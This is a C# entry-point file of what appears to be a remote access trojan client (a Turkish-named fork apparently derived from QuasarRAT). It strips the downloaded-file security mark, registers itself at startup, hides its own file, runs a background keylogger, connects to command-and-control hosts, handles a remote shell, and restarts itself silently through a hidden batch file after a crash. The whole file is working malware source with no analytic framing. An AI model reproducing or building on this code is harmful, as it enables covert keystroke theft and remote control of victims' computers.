using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using xClient.Ayarlar;
using xClient.KuuhakuÇekirdek.Ağ;
using xClient.KuuhakuÇekirdek.Kriptografi;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Eylemler;
using xClient.KuuhakuÇekirdek.Kurulum;
using xClient.KuuhakuÇekirdek.Utilityler;
using xClient.KuuhakuÇekirdek.Yardımcılar;

namespace xClient
{
    internal static class Program
    {
        public static KuuhakuClient ConnectClient;
        private static ApplicationContext _msgLoop;

        [STAThread]
        private static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;

            if (Settings.Initialize())
            {
                if (Initialize())
                {
                    if (!KuuhakuClient.Exiting)
                        ConnectClient.Connect();
                }
            }

            Cleanup();
            Exit();
        }

        private static void Exit()
        {
            if (_msgLoop != null || Application.MessageLoop)
                Application.Exit();
            else
                Environment.Exit(0);
        }

        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            if (e.IsTerminating)
            {
                var batchFile = DosyaYardımcısı.YenidenBaşlatmaBatı();
                if (string.IsNullOrEmpty(batchFile)) return;

                var startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);
                Exit();
            }
        }

        private static void Cleanup()
        {
            Eylemİşleyicisi.CloseShell();
            if (Eylemİşleyicisi.StreamCodec != null)
                Eylemİşleyicisi.StreamCodec.Dispose();
            if (Keylogger.Instance != null)
                Keylogger.Instance.Dispose();
            if (_msgLoop != null)
            {
                _msgLoop.ExitThread();
                _msgLoop.Dispose();
                _msgLoop = null;
            }
            MutexHelper.CloseMutex();
        }

        private static bool Initialize()
        {
            var hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));

            if (!MutexHelper.CreateMutex(Settings.MUTEX) || hosts.IsEmpty || string.IsNullOrEmpty(Settings.VERSION))
                return false;

            AES.SetDefaultKey(Settings.PASSWORD);
            ClientVerisi.InstallPath = Path.Combine(Settings.DIR,
                ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
            GeoLocationHelper.Initialize();

            DosyaYardımcısı.DeleteZoneIdentifier(ClientVerisi.CurrentPath);

            if (!Settings.INSTALL || ClientVerisi.CurrentPath == ClientVerisi.InstallPath)
            {
                WindowsAccountHelper.StartUserIdleCheckThread();

                if (Settings.STARTUP)
                {
                    if (!Başlangıç.AddToStartup())
                        ClientVerisi.AddToStartupFailed = true;
                }

                if (Settings.INSTALL && Settings.HIDEFILE)
                {
                    try
                    {
                        File.SetAttributes(ClientVerisi.CurrentPath, FileAttributes.Hidden);
                    }
                    catch (Exception)
                    {
                    }
                }

                if (Settings.ENABLELOGGER)
                {
                    new Thread(() =>
                    {
                        _msgLoop = new ApplicationContext();
                        var logger = new Keylogger(15000);
                        Application.Run(_msgLoop);
                    }) {IsBackground = true}.Start();
                }

                ConnectClient = new KuuhakuClient(hosts);
                return true;
            }
            MutexHelper.CloseMutex();
            ClientYükleyici.Install(ConnectClient);
            return false;
        }
    }
}